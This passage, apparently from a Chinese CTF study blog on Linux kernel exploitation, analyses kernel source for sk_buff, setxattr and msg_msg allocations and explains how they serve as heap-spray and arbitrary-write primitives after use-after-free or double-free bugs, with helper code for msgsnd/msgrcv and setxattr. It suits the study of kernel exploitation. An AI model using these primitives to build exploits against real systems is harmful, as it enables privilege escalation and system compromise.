size;\n\tskb->mac_header = (typeof(skb->mac_header))~0U;\n\tskb->transport_header = (typeof(skb->transport_header))~0U;\n\t//...\nout:\n\treturn skb;\nnodata:\n\tkmem_cache_free(cache, skb);\n\tskb = NULL;\n\tgoto out;\n}\n```\n\n###### 内存申请总结：\n\n- `sk_buff`为数据的管理结构从专门的缓存池`skbuff_fclone_cache/skbuff_head_cache`中申请内存，没办法进行控制\n- `skb->data`为实际的数据结构\n  - `size`：`0x140+n*0x40`(0x40的倍数补齐)。即如果传入的数据长度为0x3f，则n为1，传入数据为0x41，则n为2。\n  - 堆块申请：走`kmalloc`进行申请，比较常见的种类，方便堆喷。\n- 每调用`wirte`函数写入一次数据，都会走一遍流程，申请新的`sk_buff`和`skb->data`，不同消息之间相互独立。\n\n##### B.数据复制\n\n相关内存申请完成之后，回到`unix_stream_sendmsg`函数，开始进行数据复制`skb_copy_datagram_from_iter`，即上述提到的。\n\n```c\n//v5.9 /net/core/datagram.c\nint skb_copy_datagram_from_iter(struct sk_buff *skb, int offset,\n                                struct iov_iter *from,\n                                int len)\n{\n    int start = skb_headlen(skb);\t\t\t// skb->len - skb->data_len;\n    int i, copy = start - offset;\t\t\t// copy 是线性数据区的剩余空间大小\n    struct sk_buff *frag_iter;\n    //拷贝到申请的保存数据的堆块skb->data\n    if (copy > 0) {\n        if (copy > len)\n            copy = len;\n        if (copy_from_iter(skb->data + offset, copy, from) != copy)\n            goto fault;\n        if ((len -= copy) == 0)\n            return 0;\n        offset += copy;\n    }\n    //....\n}\n```\n\n\n\n#### ②释放\n\n当从`socker`套接字中读取出某条信息的所有数据时，就会发生该条信息的相关内存的释放，即该条信息对应`sk_buff`和`skb->data`的释放。同样的，如果该条信息没有被读取完毕，则不会发生该信息相关内存的释放。\n\n在`read`时进行的函数调用链：\n\n```\nread -> ksys_read() -> vfs_read() -> new_sync_read() -> call_read_iter() -> sock_read_iter() -> sock_recvmsg() -> sock_recvmsg_nosec() -> unix_stream_recvmsg() -> unix_stream_read_generic()\n```\n\n同样的在`unix_stream_read_generic`处开始分叉，也是分为两部分，下面截取重要部分\n\n```c\n//v5.9 /net/unix/af_unix.c\nstatic int unix_stream_read_generic(struct unix_stream_read_state *state,\n\t\t\t\t    bool freezable)\n{\n    //....\n\tdo {\n        //....\n\t\tchunk = min_t(unsigned int, unix_skb_len(skb) - skip, size);\n\t\tskb_get(skb);\n        //------------------分叉一:数据复制\n        //recv_actor函数指针是在unix_stream_recvmsg函数中定义的state函数表\n        //该函数指针对应unix_stream_read_actor函数,即从这开始进行数据复制\n\t\tchunk = state->recv_actor(skb, skip, chunk, state);\n        //...\n        //传输数据完成之后,skb->users从2改为1,表示已经复制完数据了,方便后续判断\n        //消息中是否还有数据\n\t\tconsume_skb(skb);\n\t\tif (chunk < 0) {\n\t\t\tif (copied == 0)\n\t\t\t\tcopied = -EFAULT;\n\t\t\tbreak;\n\t\t}\n\t\tcopied += chunk;\n\t\tsize -= chunk;\n\n\t\t/* Mark read part of skb as used */\n\t\tif (!(flags & MSG_PEEK)) {\n            //修改skb类型转换之后对应的consumed字段,其实就是skb->cb某个位置处的数据\n            //#define UNIXCB(skb)\t(*(struct unix_skb_parms *)&((skb)->cb))\n\t\t\tUNIXCB(skb).consumed += chunk;\n\t\t\t//依据上面的consumed和len来判断消息中是否还剩下没有传输的数据\n            //有(1)则break,无(0)则进入后续的内存释放阶段\n\t\t\tif (unix_skb_len(skb))\n\t\t\t\tbreak;\n            //------------------------分叉二:内存释放\n            //内存释放前置工作\n\t\t\tskb_unlink(skb, &sk->sk_receive_queue);\n            //进入该函数,通过对于skb->users的判断之后,进入内存释放阶段\n\t\t\tconsume_skb(skb);\n            //....................\n\t} while (size);\n        //......................\nout:\n\treturn copied ? : err;\n}\n```\n\n##### A.数据复制\n\n之后的函数调用链为\n\n```\nunix_stream_read_actor() -> skb_copy_datagram_msg() -> skb_copy_datagram_iter() -> __skb_datagram_iter()\n```\n\n最终进入`__skb_datagram_iter`，\n\n```c\n//v5.9 /net/core/datagram.c\nstatic int __skb_datagram_iter(const struct sk_buff *skb, int offset,\n\t\t\t       struct iov_iter *to, int len, bool fault_short,\n\t\t\t       size_t (*cb)(const void *, size_t, void *,\n\t\t\t\t\t    struct iov_iter *), void *data)\n{\n\tint start = skb_headlen(skb);\n\tint i, copy = start - offset, start_off = offset, n;\n\tstruct sk_buff *frag_iter;\n\n\t/* Copy header. */\n    //这个header指的就是数据data,大概就是从这里开始实际的数据\n\tif (copy > 0) {\n\t\tif (copy > len)\n\t\t\tcopy = len;\n\t\tn = INDIRECT_CALL_1(cb, simple_copy_to_iter,\n\t\t\t\t    skb->data + offset, copy, data, to);\n\t\toffset += n;\n\t\tif (n != copy)\n\t\t\tgoto short_copy;\n\t\tif ((len -= copy) == 0)\n\t\t\treturn 0;\n\t}\n    //......\n    /* Copy paged appendix. Hmm... why does this look so complicated? */\n    //linux内核维护人员都看不下去了,xs\n    //......\n}\n```\n\n这里使用了感觉很复杂的机制，不是很懂。\n\n##### B.内存释放\n\n进入内存释放的函数调用链为\n\n- 释放`skb->data`部分：\n\n  ```\n  consume_skb()->__kfree_skb()->skb_release_all()->skb_release_all()->skb_release_data()->skb_free_head()\n  ```\n\n  对应函数如下：\n\n  ```c\n  //v5.9 /net/core/skbuff.c\n  static void skb_free_head(struct sk_buff *skb)\n  {\n      //其实head和data是一样的\n  \tunsigned char *head = skb->head;\n  \tif (skb->head_frag) {\n  \t\tif (skb_pp_recycle(skb, head))\n  \t\t\treturn;\n  \t\tskb_free_frag(head);\n  \t} else {\n  \t\tkfree(head);\n  \t}\n  }\n  ```\n\n  可以看到使用的正常的`kfree`函数\n\n- 释放`skb`部分：\n\n  ```\n  consume_skb()->__kfree_skb()->kfree_skbmem()\n  ```\n\n  相关函数如下\n\n  ```c\n  //v5.9 /net/core/skbuff.c\n  static void kfree_skbmem(struct sk_buff *skb)\n  {\n      struct sk_buff_fclones *fclones;\n      //克隆体相关的,没有fork之类的话一般不用太管的\n      switch (skb->fclone) {\n          case SKB_FCLONE_UNAVAILABLE:\n              //用专门的cache(skbuff_head_cache)进行回收\n              kmem_cache_free(skbuff_head_cache, skb);\n              return;\n  \n          case SKB_FCLONE_ORIG:\n              fclones = container_of(skb, struct sk_buff_fclones, skb1);\n  \n              /* We usually free the clone (TX completion) before original skb\n  \t\t * This test would have no chance to be true for the clone,\n  \t\t * while here, branch prediction will be good.\n  \t\t */\n              if (refcount_read(&fclones->fclone_ref) == 1)\n                  goto fastpath;\n              break;\n  \n          default: /* SKB_FCLONE_CLONE */\n              fclones = container_of(skb, struct sk_buff_fclones, skb2);\n              break;\n      }\n      if (!refcount_dec_and_test(&fclones->fclone_ref))\n          return;\n  fastpath:\n      //用专门的cache(skbuff_fclone_cache)进行回收克隆的skb\n      kmem_cache_free(skbuff_fclone_cache, fclones);\n  }\n  \n  ```\n\n  这个就不太好利用了。\n\n  同样的，当关闭的信道的两端，该信道内产生的所有的`sk_buff`和`skb->data`都会得到释放\n\n##### 内存释放总结：\n\n- 当从信道中将某条消息全部读取完之后，会发生该条消息对应的`sk_buff`和`skb->data`的内存释放，且`sk_buff`释放到专门的缓存池中，`skb->data`使用正常的`kfree`释放\n\n- 当关闭信道两端，该信道内产生的所有的`sk_buff`和`skb->data`都会得到释放，具体的调用链为：\n\n  ```\n  sock_close()->__sock_release()->unix_release()->__kfree_skb()\n  ```\n\n  后面就类似了。\n\n## 9.setxattr---近乎任意大小\n\n这个总结过，直接扒过来\n\n调用链为\n\n```\nSYS_setxattr()->path_setxattr()->setxattr()\n```\n\n代码如下\n\n```c\n//fs/xattr.c\nstatic long\nsetxattr(struct user_namespace *mnt_userns, struct dentry *d,\n\t const char __user *name, const void __user *value, size_t size,\n\t int flags)\n{\n\tint error;\n\tvoid *kvalue = NULL;\n\tchar kname[XATTR_NAME_MAX + 1];\n\n\tif (flags & ~(XATTR_CREATE|XATTR_REPLACE))\n\t\treturn -EINVAL;\n\n\terror = strncpy_from_user(kname, name, sizeof(kname));\n\tif (error == 0 || error == sizeof(kname))\n\t\terror = -ERANGE;\n\tif (error < 0)\n\t\treturn error;\n\n\tif (size) {\n\t\tif (size > XATTR_SIZE_MAX)\n\t\t\treturn -E2BIG;\n        //申请chunk，基本相当于kmalloc函数，size可控\n\t\tkvalue = kvmalloc(size, GFP_KERNEL);\n\t\tif (!kvalue)\n\t\t\treturn -ENOMEM;\n        //从value拷贝内容到kvalue，value可控\n\t\tif (copy_from_user(kvalue, value, size)) {\n\t\t\terror = -EFAULT;\n\t\t\tgoto out;\n\t\t}\n\t\tif ((strcmp(kname, XATTR_NAME_POSIX_ACL_ACCESS) == 0) ||\n\t\t    (strcmp(kname, XATTR_NAME_POSIX_ACL_DEFAULT) == 0))\n\t\t\tposix_acl_fix_xattr_from_user(mnt_userns, kvalue, size);\n\t}\n\n\terror = vfs_setxattr(mnt_userns, d, kname, kvalue, size, flags);\nout:\n    //释放chunk，基本等于kfree函数\n\tkvfree(kvalue);\n\n\treturn error;\n}\n```\n\n关注点在`kvmalloc`、`copy_from_user`、`kvfree`。\n\n`kvmalloc`中的size可控，`copy_from_user`中的`value`可控\n\n也就是说当`freelist`中存在我们需要修改的chunk，而该chunk又是我们控制的某个设备内存块时，(通过double-free或者UAF实现)那么我们就可以通过`setxattr`来对该设备内存进行任意写。虽然最后会释放，但是也只会影响内存块中存放下一个chunk地址处的内容0x8个字节，而当我们用不着这个地方的内容时，就不用太关注了。\n\n### 🔺注：\n\n使用的时候需要注意指定一个当前的exp程序，类似如下，第二个参数字符串任意。\n\n```C\nsetxattr(\"/tmp/ufdExp\", \"PIG-007\", &buf,0x100,0);\n```\n\n## 10.msg_msg结构体---kmalloc-16至kmalloc-1024\n\n这个在之前也总结过，不过总结得有些错误，也不太完善，这里再好好总结一下\n\n参照：[【NOTES.0x08】Linux Kernel Pwn IV：通用结构体与技巧 - arttnba3's blog](https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#分配（GFP-KERNEL-ACCOUNT）：msgsnd-系统调用)\n\n[Linux内核中利用msg_msg结构实现任意地址读写 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/252558)\n\n[Linux的进程间通信 - 消息队列 · Poor Zorro's Linux Book (gitbooks.io)](https://zorro.gitbooks.io/poor-zorro-s-linux-book/content/linuxde-jin-cheng-jian-tong-xin-xiao-xi-dui-lie.html)\n\n《Linux系统编程手册》\n\n虽然写的是最大`kmalloc-1024`，但是在堆喷时，可以连续`kmalloc(1024)`从而获得连续的堆内存分布，这样都释放掉之后再经过回收机制就可以申请到更大的`kmallo-xx`了。\n\n### (1)使用方法\n\n#### ①创建\n\n- 首先创建`queue_id`管理标志，对应于内核空间的`msg_queue`管理结构\n\n  ```c\n  //key要么使用ftok()算法生成,要么指定为IPC_PRIVATE\n  //代表着该消息队列在内核中唯一的标识符\n  //使用IPC_PRIVATE会生成全新的消息队列IPC对象\n  int32_t make_queue(key_t key, int msg_flag)\n  {\n      int32_t result;\n      if ((result = msgget(key, msg_flag)) == -1) \n      {\n          perror(\"msgget failure\");\n          exit(-1);\n      }\n      return result;\n  }\n  \n  int queue_id = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);\n  ```\n\n  使用简单封装的`msgget`函数或者系统调用号`__NR_msgget`，之后保存数据的消息就会在这个`queue_id`管理标志，以及内核空间的`msg_queue`管理结构下进行创建\n\n#### ②数据传输\n\n- 写入消息：\n\n  然后就可以依据`queue_id`写入消息了，不同于`pipe`和`socketpair`，这个需要特定的封装函数（`msgsnd/msgrcv`）或者对应的系统调用（`__NR_msgrcv/__NR_msgsnd`）来实现。\n\n  ```c\n  typedef struct\n  {\n          long mtype;\n          char mtext[1];\n  }msgp;\n  \n  //msg_buf实际上为msgp,里面包含mtype,这个mtype在后面的堆块构造中很有用\n  void send_msg(int msg_queue_id, void *msg_buf, size_t msg_size, int msg_flag)\n  {\n      if (msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag) == -1)\n      {\n          perror(\"msgsend failure\");\n          exit(-1);\n      }\n      return;\n  }\n  \n  char queue_send_buf[0x2000];\n  m_ts_size = 0x400-0x30;//任意指定\n  msg *message = (msg *)queue_send_buf;\n  message->mtype = 0;\n  send_msg(queue_id, message, m_ts_size, 0);\n  ```\n\n- 读取消息：\n\n  之后即可依据`queue_id`读取消息\n\n  ```c\n  void get_msg(int msg_queue_id, void *msg_buf, size_t msg_size, long msgtyp, int msg_flag)\n  {\n      if (msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag) < 0)\n      {\n          perror(\"msgrcv\");\n          exit(-1);\n      }\n      return;\n  }\n  \n  char queue_recv_buf[0x2000];\n  m_ts_size = 0x400-0x30;//任意指定\n  get_msg(queue_id, queue_recv_buf, m_ts_size, 0, IPC_NOWAIT | MSG_COPY);\n  ```\n\n- `mtype`\n\n  可通过设置该值来实现不同顺序的消息读取，在之后的堆块构造中很有用\n\n  - 在写入消息时，指定`mtype`，后续接收消息时可以依据此`mtype`来进行非顺序接收\n  - 在读取消息时，指定`msgtyp`，分为如下情况\n    - `msgtyp`大于0：那么在`find_msg`函数中，就会将遍历寻找消息队列里的第一条等于`msgtyp`的消息，然后进行后续操作。\n    - `msgtyp`等于0：即类似于顺序读取，`find_msg`函数会直接获取到消息队列首个消息。\n    - `msgtyp`小于0：会将等待的消息当成优先队列来处理，`mtype`的值越小，其优先级越高。\n\n- `msg_flag`\n\n可以关注一下`MSG_NOERROR`标志位，比如说`msg_flag`没有设置`MSG_NOERROR`的时候，那么情况如下：\n\n假定获取消息时输入的长度`m_ts_size`为`0x200`，且这个长度大于通过`find_msg()`函数获取到的消息长度`0x200`，则可以顺利读取，如果该长度小于获取到的消息长度`0x200`，则会出现如下错误\n\n![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511193452872.png)\n\n但是如果设置了`MSG_NOERROR`，那么即使传入接收消息的长度小于获取到的消息长度，仍然可以顺利获取，但是多余的消息会被截断，相关内存还是会被释放，这个在源代码中也有所体现。\n\n```c\n//v5.11 /ipc/msg.c do_msgrcv函数中\nif ((bufsz < msg->m_ts) && !(msgflg & MSG_NOERROR)) {\n    msg = ERR_PTR(-E2BIG);\n    goto out_unlock0;\n}\n```\n\n此外还有更多的`msg_flag`，就不一一举例了。\n\n#### ③释放\n\n这个主要是用到`msgctl`封装函数或者`__NR_msgctl`系统调用，直接释放掉所有的消息结构，包括申请的`msg_queue`的结构\n\n```c\n//其中IPC_RMID这个cmd命令代表释放掉该消息队列的所有消息,各种内存结构体等\nif(msgctl(queue_id),IPC_RMID,NULL)==-1)\n{\n    perror(\"msgctl\");\n    exit(-1);\n}\n```\n\n不过一般也用不到，可能某些合并obj的情况能用到?\n\n此外还有更多的`cmd`命令，常用来设置内核空间的`msg_queue`结构上的相关数据，不过多介绍了。\n\n#### 总结\n\n总结一下大致的使用方法如下\n\n```c\ntypedef struct\n{\n        long mtype;\n        char mtext[1];\n}msgp;\n\nint32_t make_queue(key_t key, int msg_flag)\n{\n    int32_t result;\n    if ((result = msgget(key, msg_flag)) == -1) \n    {\n        perror(\"msgget failure\");\n        exit(-1);\n    }\n    return result;\n}\n\n\n\nvoid get_msg(int msg_queue_id, void *msg_buf, size_t msg_size, long msgtyp, int msg_flag)\n{\n    if (msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag) < 0)\n    {\n        perror(\"msgrcv\");\n        exit(-1);\n    }\n    return;\n}\n\nvoid send_msg(int msg_queue_id, void *msg_buf, size_t msg_size, int msg_flag)\n{\n    if (msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag) == -1)\n    {\n        perror(\"msgsend failure\");\n        exit(-1);\n    }\n    return;\n}\n\n\nint main()\n{\n    int queue_id, m_ts_size;\n    char queue_recv_buf[0x2000];\n    char queue_send_buf[0x2000];\n    \n    m_ts_size = 0x400-0x30;\n    msgp *message = (msgp *)queue_send_buf;\n    message->mtype = 0;\n    \n    memset(message->mtext,'\\xaa', m_ts_size);\n    memset(queue_recv_buf, '\\xbb', sizeof(queue_recv_buf));\n    \n    queue_id = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);\n    send_msg(queue_id, message, m_ts_size, 0);\n    get_msg(queue_id, queue_recv_buf, m_ts_size, 0, IPC_NOWAIT | MSG_COPY);\n    \n    return 0;\n}\n```\n\n### (2)内存分配与释放\n\n#### ①创建\n\n##### A.内存申请\n\n- 还是需要先创建`msg_queue`结构体，使用`msgget`函数，调用链为\n\n  ```\n  msgget(key,msg_flag)->ksys_msgget()->ipcget()->ipcget_new()->newque()\n  ```\n\n  主要还是关注最后的`newque()`函数，在该函数中使用`kvmalloc()`申请堆块，大小为0x100，属于`kmalloc-256`，(不同版本大小貌似不同)。\n\n  ```c\n  //v5.11 /ipc/msg.c\n  static int newque(struct ipc_namespace *ns, struct ipc_params *params)\n  {\n  \tstruct msg_queue *msq;\n  \tint retval;\n  \tkey_t key = params->key;\n  \tint msgflg = params->flg;\n  \n      //这个才是实际申请的堆块内存\n  \tmsq = kvmalloc(sizeof(*msq), GFP_KERNEL);\n  \tif (unlikely(!msq))\n  \t\treturn -ENOMEM;\n  \n  \tmsq->q_perm.mode = msgflg & S_IRWXUGO;\n  \tmsq->q_perm.key = key;\n  \n  \tmsq->q_perm.security = NULL;\n      //进行相关注册\n  \tretval = security_msg_queue_alloc(&msq->q_perm);\n  \tif (retval) {\n  \t\tkvfree(msq);\n  \t\treturn retval;\n  \t}\n  \n      //初始化\n  \tmsq->q_stime = msq->q_rtime = 0;\n  \tmsq->q_ctime = ktime_get_real_seconds();\n  \tmsq->q_cbytes = msq->q_qnum = 0;\n  \tmsq->q_qbytes = ns->msg_ctlmnb;\n  \tmsq->q_lspid = msq->q_lrpid = NULL;\n  \tINIT_LIST_HEAD(&msq->q_messages);\n  \tINIT_LIST_HEAD(&msq->q_receivers);\n  \tINIT_LIST_HEAD(&msq->q_senders);\n  \n      //下面一堆看不懂在干啥\n  \t/* ipc_addid() locks msq upon success. */\n  \tretval = ipc_addid(&msg_ids(ns), &msq->q_perm, ns->msg_ctlmni);\n  \tif (retval < 0) {\n  \t\tipc_rcu_putref(&msq->q_perm, msg_rcu_free);\n  \t\treturn retval;\n  \t}\n  \tipc_unlock_object(&msq->q_perm);\n  \trcu_read_unlock();\n  \n  \treturn msq->q_perm.id;\n  }\n  ```\n\n  创建的结构体如下所示\n\n  ```c\n  //v5.11 /ipc/msg.c\n  struct msg_queue {\n      //这些为一些相关信息\n  \tstruct kern_ipc_perm q_perm;\n  \ttime64_t q_stime;\t\t/* last msgsnd time */\n  \ttime64_t q_rtime;\t\t/* last msgrcv time */\n  \ttime64_t q_ctime;\t\t/* last change time */\n  \tunsigned long q_cbytes;\t\t/* current number of bytes on queue */\n  \tunsigned long q_qnum;\t\t/* number of messages in queue */\n  \tunsigned long q_qbytes;\t\t/* max number of bytes on queue */\n  \tstruct pid *q_lspid;\t\t/* pid of last msgsnd */\n  \tstruct pid *q_lrpid;\t\t/* last receive pid */\n  \n      //存放msg_msg相关指针next、prev,比较重要,通常拿来溢出制造UAF\n      //和该消息队列里的所有消息组成双向循环链表\n  \tstruct list_head q_messages;\n  \tstruct list_head q_receivers;\n  \tstruct list_head q_senders;\n  } __randomize_layout;\n  \n  ```\n\n- 接着当使用`msgsnd`函数传递消息时，会创建新的`msg_msg`结构体，消息过长的话就会创建更多的`msg_msgseg`来存储更多的消息。相关的函数调用链如下：\n\n  ```c\n  msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag)->do_msgsnd()->load_msg()->alloc_msg()\n  ```\n\n  主要还是关注在`alloc_msg()`函数\n\n  ```c\n  //v5.11 /ipc/msgutil.c\n  static struct msg_msg *alloc_msg(size_t len)\n  {\n  \tstruct msg_msg *msg;\n  \tstruct msg_msgseg **pseg;\n  \tsize_t alen;\n  \n      //最大发送DATALEN_MSG长度的消息\n      //#define DATALEN_MSG\t((size_t)PAGE_SIZE-sizeof(struct msg_msg))\n      //这里的PAGE_SIZE为0x400,即最多kmalloc-\n  \talen = min(len, DATALEN_MSG);\n      //使用正常\n  \tmsg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT);\n  \tif (msg == NULL)\n  \t\treturn NULL;\n  \n      //如果传入消息长度超过0x400-0x30,就再进行申请msg_msgseg。\n      //使用kmalloc申请,标志为GFP_KERNEL_ACCOUNT。\n      //最大也为0x400,也属于kmalloc-1024\n      //还有再长的消息,就再申请msg_msgseg\n  \tmsg->next = NULL;\n  \tmsg->security = NULL;\n  \tlen -= alen;\n  \tpseg = &msg->next;\n  \twhile (len > 0) {\n  \t\tstruct msg_msgseg *seg;\n  \t\t//不知道干啥的\n  \t\tcond_resched();\n  \n  \t\talen = min(len, DATALEN_SEG);\n  \t\tseg = kmalloc(sizeof(*seg) + alen, GFP_KERNEL_ACCOUNT);\n          //申请完之后,将msg_msgseg放到msg->next这个单向链表上\n  \t\tif (seg == NULL)\n  \t\t\tgoto out_err;\n  \t\t*pseg = seg;\n  \t\tseg->next = NULL;\n  \t\tpseg = &seg->next;\n  \t\tlen -= alen;\n  \t}\n  \n  \treturn msg;\n  \n  out_err:\n  \tfree_msg(msg);\n  \treturn NULL;\n  }\n  ```\n\n  - `msg_msg`结构体如下，头部大小`0x30`\n\n    ```c\n    //v5.11 /include/linux/msg.h\n    struct msg_msg {\n    \tstruct list_head m_list;//与msg_queue或者其他的msg_msg组成双向循环链表\n    \tlong m_type;\n    \tsize_t m_ts;\t\t/* message text size */\n    \tstruct msg_msgseg *next;//单向链表，指向该条信息后面的msg_msgseg\n    \tvoid *security;\n    \t/* the actual message follows immediately */\n    };\n    ```\n\n    如下所示\n\n    <img src=\"https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220130886.png\" alt=\"image-20220511220130886\" style=\"zoom:80%;\" />\n\n  - `msg_msgseq`结构如下，只是一个`struct msg_msgseg*`指针\n\n    ```c\n    //v5.11 /ipc/msgutil.c\n    struct msg_msgseg {\n    \tstruct msg_msgseg *next;\n    \t/* the next part of the message follows immediately */\n    };\n    ```\n\n    如下所示\n\n    <img src=\"https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220627775.png\" alt=\"image-20220511220627775\" style=\"zoom:80%;\" />\n\n###### 相关内存结构：\n\n在一个`msg_queue`队列下，消息长度为`0x1000-0x30-0x8-0x8-0x8`\n\n- 一条消息：\n\n  ![image-20220511231539231](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511231539231.png)\n\n- 两条消息：\n\n  以`msg_queue`的`struct list_head q_messages;`域为链表头，和`msg_msg`结构的`struct list_head m_list`域串联所有的`msg_msg`形成双向循环链表\n\n  ![未命名文件](https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6.png)\n\n同理，同一个`msg_queue`消息队列下的多条消息也是类似的\n\n###### 内存申请总结：\n\n- 使用`msgget()`函数创建内核空间的消息队列结构`msg_msgseg`，返回值为消息队列的`id`标志`queue_id`\n  - `msg_msgseg`管理整个消息队列，大小为0x100，`kmalloc-256`。\n  - 其`struct list_head q_messages;`域为链表头，和`msg_msg`结构的`struct list_head m_list`域串联所有的`msg_msg`形成双向循环链表\n- 每次在该消息队列`queue_id`下调用`msgsnd()`函数都会申请内核空间的`msg_msg`结构，消息长度大于`0x400-0x30`就会申请内核空间的`msg_msgseg`结构\n  - `msg_msg`为每条消息存放消息数据的结构，与`msg_queue`形成双向循环链表，与`msg_msgseg`形成单向链表大小最大为0x400，属于`kmalloc-64`至`kmalloc-1024`\n  - `msg_msgseg`也为每条消息存放消息数据的结构，挂在`msg_msg`单向链表中，大小最大为`0x400`，属于`kmalloc-16`至`kmalloc-1024`，当消息长度很长时就会申请很多的内核空间的`msg_msgseg`结构。\n\n\n\n##### B.数据复制\n\n调用完`alloc_msg()`函数后，回到`load_msg()`函数接着进行数据复制，函数还是挺简单的。\n\n```c\nstruct msg_msg *load_msg(const void __user *src, size_t len)\n{\n\tstruct msg_msg *msg;\n\tstruct msg_msgseg *seg;\n\tint err = -EFAULT;\n\tsize_t alen;\n\n\tmsg = alloc_msg(len);\n\tif (msg == NULL)\n\t\treturn ERR_PTR(-ENOMEM);\n\n    //先复制进msg_msg中存放消息的部分\n\talen = min(len, DATALEN_MSG);\n\tif (copy_from_user(msg + 1, src, alen))\n\t\tgoto out_err;\n\n    //遍历msg_msg下的msg_msgseg,逐个存放数据进去\n\tfor (seg = msg->next; seg != NULL; seg = seg->next) {\n\t\tlen -= alen;\n\t\tsrc = (char __user *)src + alen;\n\t\talen = min(len, DATALEN_SEG);\n\t\tif (copy_from_user(seg + 1, src, alen))\n\t\t\tgoto out_err;\n\t}\n\n\terr = security_msg_msg_alloc(msg);\n\tif (err)\n\t\tgoto out_err;\n\n\treturn msg;\n\nout_err:\n\tfree_msg(msg);\n\treturn ERR_PTR(err);\n}\n```\n\n\n\n#### ②释放\n\n相关的函数调用链\n\n```\nmsgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag)->SYS_msgrcv()->ksys_msgrcv()->do_msgrcv()->do_msg_fill()->store_msg()\n```\n\n首先关注一下`do_msgrcv()`函数，里面很多东西都比较重要\n\n```c\nstatic long do_msgrcv(int msqid, void __user *buf, size_t bufsz, long msgtyp, int msgflg,\n                      long (*msg_handler)(void __user *, struct msg_msg *, size_t))\n{\n    int mode;\n    struct msg_queue *msq;\n    struct ipc_namespace *ns;\n    struct msg_msg *msg, *copy = NULL;\n    DEFINE_WAKE_Q(wake_q);\n    //....\n    if (msqid < 0 || (long) bufsz < 0)\n        return -EINVAL;\n    //设置了MSG_COPY标志位就会准备一个msg_msg的副本copy,通常用来防止unlink\n    if (msgflg & MSG_COPY) {\n        //从这里可以看出,同样也需要设置IPC_NOWAIT标志位才不会出错\n        if ((msgflg & MSG_EXCEPT) || !(msgflg & IPC_NOWAIT))\n            return -EINVAL;\n        //这个prepare_copy()函数内部调用了load_msg()函数来创建一个新的msg_msg/msg_msgseg\n        //传入的size参数为bufsz,就用户空间实际需要消息的长度,那么申请的堆块长度就可变了\n        //不一定是这条消息的长度,而是由我们直接控制,虽然最后也会释放掉\n        copy = prepare_copy(buf, min_t(size_t, bufsz, ns->msg_ctlmax));\n        /*\n        static inline struct msg_msg *prepare_copy(void __user *buf, size_t bufsz)\n        {\n            struct msg_msg *copy;\n            \n            copy = load_msg(buf, bufsz);\n            if (!IS_ERR(copy))\n                copy->m_ts = bufsz;\n            return copy;\n        }\n        */\n        if (IS_ERR(copy))\n            return PTR_ERR(copy);\n    }\n    //这样就不会将msg_msg从msg_queue消息队列中进行Unlink摘除\n    //只是释放堆块,在后续的代码中有显示\n    //......\n    //开始从msg_queue中寻找合适的msg_msg\n    for (;;) {\n        //.....\n        msg = find_msg(msq, &msgtyp, mode);\n        if (!IS_ERR(msg)) {\n            /*\n\t\t\t * Found a suitable message.\n\t\t\t * Unlink it from the queue.\n\t\t\t */\n            //最好设置MSG_NOERROR标志位,这样请求获取消息长度小于m_ts程序也不会退出了\n            if ((bufsz < msg->m_ts) && !(msgflg & MSG_NOERROR)) {\n                msg = ERR_PTR(-E2BIG);\n                goto out_unlock0;\n            }\n            /*\n\t\t\t * If we are copying, then do not unlink message and do\n\t\t\t * not update queue parameters.\n\t\t\t */\n            //设置了MSG_COPY标志位就会将msg数据复制给copy,然后将copy赋给msg\n            if (msgflg & MSG_COPY) {\n                //这个copy_msg()函数就是之前提到的在汇编层面就很奇怪\n                msg = copy_msg(msg, copy);\n                goto out_unlock0;\n            }\n\n            //下面是将msg_msg从和msg_queue组成的双向循环链表中unlink出来的部分\n            list_del(&msg->m_list);\n            msq->q_qnum--;\n            msq->q_rtime = ktime_get_real_seconds();\n            ipc_update_pid(&msq->q_lrpid, task_tgid(current));\n            msq->q_cbytes -= msg->m_ts;\n            atomic_sub(msg->m_ts, &ns->msg_bytes);\n            atomic_dec(&ns->msg_hdrs);\n            ss_wakeup(msq, &wake_q, false);\n\n            goto out_unlock0;\n        }\n        //....\n    }\n\nout_unlock0:\n    ipc_unlock_object(&msq->q_perm);\n    wake_up_q(&wake_q);\nout_unlock1:\n    rcu_read_unlock();\n    //如果存在copy副本,那么就free掉copy副本,然后返回,而不会free掉原本的msg堆块\n    if (IS_ERR(msg)) {\n        free_copy(copy);\n        return PTR_ERR(msg);\n    }\n    //这个msg_handler函数指针即为传入的do_msg_fill()函数,从里面进行相关的数据复制\n    bufsz = msg_handler(buf, msg, bufsz);\n    //最后在这里进行相关堆块的释放\n    free_msg(msg);\n\n    return bufsz;\n}\n\n```\n\n##### A.非堆块释放的数据读取\n\n一般而言，我们使用`msg_msg`进行堆构造（比如溢出或者其他什么的）的时候，当需要从消息队列中读取消息而又不想释放该堆块时，会结合`MSG_COPY`这个`msgflg`标志位，防止在读取的时候发生堆块释放从而进行双向循环链表的`unlink`触发错误。\n\n```c\n//v5.11 do_msgrcv()函数中的\n/* If we are copying, then do not unlink message and do\n    * not update queue parameters.\n    */\nif (msgflg & MSG_COPY) {\n    msg = copy_msg(msg, copy);\n    goto out_unlock0;\n}\n\n//下面是unlink的部分,如果msg_msg结构被修改了可能会出错的\nlist_del(&msg->m_list);\nmsq->q_qnum--;\nmsq->q_rtime = ktime_get_real_seconds();\nipc_update_pid(&msq->q_lrpid, task_tgid(current));\nmsq->q_cbytes -= msg->m_ts;\natomic_sub(msg->m_ts, &ns->msg_bytes);\natomic_dec(&ns->msg_hdrs);\nss_wakeup(msq, &wake_q, false);\n\ngoto 